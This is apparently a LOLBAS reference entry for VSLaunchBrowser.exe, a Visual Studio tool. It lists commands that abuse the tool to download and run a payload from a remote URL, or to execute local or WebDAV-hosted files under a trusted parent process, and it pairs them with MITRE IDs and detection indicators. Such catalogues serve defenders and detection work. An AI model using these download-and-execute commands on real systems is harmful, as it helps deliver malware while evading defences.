---
Acknowledgement:
- Person: Avihay El
Author: Avihay Eldad
Commands:
- Category: Download
  Command: VSLaunchBrowser.exe .exe {REMOTEURL:.exe}
  Description: Download and execute payload from remote server
  MitreID: T1105
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: It will download a remote file to INetCache and open it using the default
    app associated with the supplied file extension with VSLaunchBrowser as parent
    process.
- Category: Execute
  Command: VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe}
  Description: Execute payload via VSLaunchBrowser as parent process
  MitreID: T1127
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Execute: EXE
  Usecase: It will open a local file using the default app associated with the supplied
    file extension with VSLaunchBrowser as parent process.
- Category: Execute
  Command: VSLaunchBrowser.exe .exe {PATH_SMB}
  Description: Execute payload from WebDAV server via VSLaunchBrowser as parent process
  MitreID: T1127
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Execute: EXE
  - Execute: Remote
  Usecase: It will open a remote file using the default app associated with the supplied
    file extension with VSLaunchBrowser as parent process.
Created: 2024-04-12
Description: Microsoft Visual Studio browser launcher tool for web applications debugging
Detection:
- IOC: cmd.exe as sub-process of VSLaunchBrowser
- IOC: URL on a VSLaunchBrowser command line
- IOC: VSLaunchBrowser making unexpected network connections or DNS requests
Full_Path:
- Path: C:\Program Files\Microsoft Visual Studio\<version>\Community\Common7\IDE\VSLaunchBrowser.exe
- Path: C:\Program Files (x86)\Microsoft Visual Studio\<version>\Community\Common7\IDE\VSLaunchBrowser.exe
Name: VSLaunchBrowser.exe
mitre_data:
  technique_ids:
  - T1105
  - T1127
tags:
- lolbas/othermsbinaries
---

# VSLaunchBrowser.exe

Microsoft Visual Studio browser launcher tool for web applications debugging

# Path(s)

- `C:\Program Files\Microsoft Visual Studio\<version>\Community\Common7\IDE\VSLaunchBrowser.exe`
- `C:\Program Files (x86)\Microsoft Visual Studio\<version>\Community\Common7\IDE\VSLaunchBrowser.exe`

# Execute Commands

Execute payload via VSLaunchBrowser as parent process

```batch
VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe}
```

- **Usecase:** It will open a local file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.
- **Privileges Required:** User
- **MitreID:** `T1127`
- **Operating System(s):** Windows



Execute payload from WebDAV server via VSLaunchBrowser as parent process

```batch
VSLaunchBrowser.exe .exe {PATH_SMB}
```

- **Usecase:** It will open a remote file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.
- **Privileges Required:** User
- **MitreID:** `T1127`
- **Operating System(s):** Windows



# Download Commands

Download and execute payload from remote server

```batch
VSLaunchBrowser.exe .exe {REMOTEURL:.exe}
```

- **Usecase:** It will download a remote file to INetCache and open it using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows


# Acknowledgements

- Avihay Eldad (Authored, 2024-04-12)
- Avihay El